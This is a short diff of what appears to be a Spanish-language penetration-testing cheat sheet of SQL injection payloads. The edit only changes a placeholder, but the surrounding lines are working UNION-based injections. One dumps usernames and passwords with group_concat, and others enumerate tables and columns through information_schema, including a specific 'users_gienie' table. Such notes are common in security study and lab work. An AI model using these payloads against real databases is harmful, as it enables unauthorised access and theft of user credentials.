@@ -30,7 +30,7 @@ Payloads:
 ' union select group_concat(username,":", password) from <db>.<table>'-- -
 
 --> Enumerar todas las TABLAS de la base de datos X
-' union select NULL, table_name from information_schema.tables where table_schema='<nombre_DB>' -- -
+' union select NULL, table_name from information_schema.tables where table_schema='nombre_DB' -- -
 
 --> Enumerar todas las COLUMNAS donde la DB es X y la tabla es 'users_gienie'
 ' union select NULL, column_name from information_schema.columns where table_schema='public' and table_name='users_gienie' -- -
